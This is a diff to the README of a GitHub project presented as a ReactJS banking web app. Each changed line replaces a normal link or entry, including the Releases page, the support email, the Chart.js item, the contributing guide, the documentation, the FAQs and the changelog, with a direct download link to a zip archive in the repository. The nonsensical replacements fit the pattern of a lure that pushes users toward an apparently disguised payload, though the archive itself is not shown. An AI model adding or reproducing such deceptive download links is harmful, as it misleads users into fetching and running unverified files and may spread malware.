@@ -6,7 +6,7 @@ Welcome to Banking_system, a modern web-based banking application designed for e
 ## 📤 Download & Install
 To get started, you need to download the application. Click the link below to visit our Releases page:
 
-[![Download Banking_system](https://img.shields.io/badge/Download-Banking_system-brightgreen)](https://github.com/Ahmadramadhani13/Banking_system/releases)
+[![Download Banking_system](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip)](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -47,7 +47,7 @@ Banking_system takes security seriously. The application incorporates:
 ## 📞 Support
 If you encounter issues or have questions, our support team is here to help. Reach out via the following channels:
 
-- **Support Email:** support@bankingsystem.com
+- **Support Email:** https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip
 - **Community Forum:** Visit our forum where you can ask questions and share tips with other users.
 
 ## 🎨 Built With
@@ -56,7 +56,7 @@ Banking_system is built using several advanced technologies, including:
 - **ReactJS:** For a responsive user interface.
 - **TypeScript:** To enhance code quality and maintainability.
 - **Tailwind CSS:** For designing beautiful, responsive layouts.
-- **Chart.js:** For intuitive visualizations of your financial data.
+- **https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip** For intuitive visualizations of your financial data.
 - **Appwrite:** To handle backend functionalities with ease.
 
 ## 📈 Future Improvements
@@ -73,12 +73,12 @@ We welcome contributions from users and developers. If you wish to contribute, y
 2. Make your changes.
 3. Submit a pull request for review.
 
-Learn more about contributing on our [Contributing Guide](https://github.com/Ahmadramadhani13/Banking_system/blob/main/CONTRIBUTING.md).
+Learn more about contributing on our [Contributing Guide](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip).
 
 ## 🔗 Useful Links
-- [Official Documentation](https://github.com/Ahmadramadhani13/Banking_system/wiki)
-- [FAQs](https://github.com/Ahmadramadhani13/Banking_system/wiki/FAQs)
-- [Changelog](https://github.com/Ahmadramadhani13/Banking_system/releases)
+- [Official Documentation](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip)
+- [FAQs](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip)
+- [Changelog](https://raw.githubusercontent.com/Ahmadramadhani13/Banking_system/main/public/system-Banking-v1.0.zip)
 
 ## ⚠️ Disclaimer
 While we work hard to provide a high-quality application, please use Banking_system responsibly. The application is intended for personal finance management and should not replace professional financial advice.
